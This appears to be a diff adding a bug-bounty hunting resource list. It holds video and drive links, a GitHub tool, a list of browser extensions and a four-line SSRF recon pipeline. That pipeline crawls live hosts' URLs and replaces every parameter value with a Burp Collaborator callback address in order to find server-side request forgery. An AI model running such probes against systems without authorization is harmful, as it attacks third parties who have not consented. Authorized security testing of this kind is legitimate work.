@@ -1,0 +1,57 @@
+Link : https://www.youtube.com/@hasibulhasan5010/videos
+
+Detecting API endpoints and source code with JS : https://drive.google.com/file/d/13iKEa1McIGi9ruwEQidv7kTw9zptFlCe/view
+
+Open Redirect Bugs in Web Apps : https://drive.google.com/file/d/1uclfGzojc2eRY954uTuJSmGvb__mXuaQ/view
+
+Find your fast valid bug very Easy 2025: https://github.com/MuhammadWaseem29/zip-finder
+
+Bug Hunting Extension:
+1. Wappalyzer-Technology profiler
+2. Open Multiple URLs
+3. Vulners Web Scanner
+4. Hunter-Email Finder Extension
+5. OWASP Penetration Testing Kit
+6. Link Gopher
+7. retire.js
+8. VirusTotal
+9. DotGit
+10.jQuery Injector
+
+SSRF Server Side Request Forgery Vulnerability Bug Bounty:
+cat alldomain.txt | httpx > alllive.txt
+cat alllive.txt | gauplus -subs -b png,jpg,gif,jpeg,swf,woff,gif,svg -o allurls.txt
+cat allurls.txt | grep "=" | qrreplace http://<burp collaborator> > ssrf.txt
+cat ssrf.txt | httpx -fr
+
+2024: Beginner's Guide To Bug Hunting Methodology: https://www.youtube.com/watch?v=UY30TpXnImk
+
+Live bug bounty hunting on HackerOne 2025: https://drive.google.com/file/d/1uy9beOrBhPk2MRLXW17aUNF4mLPasC2C/view
+
+
+Link : https://www.youtube.com/@the_cyb3rb0y/videos
+
+
+https://www.youtube.com/results?search_query=bug+hunting+poc
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
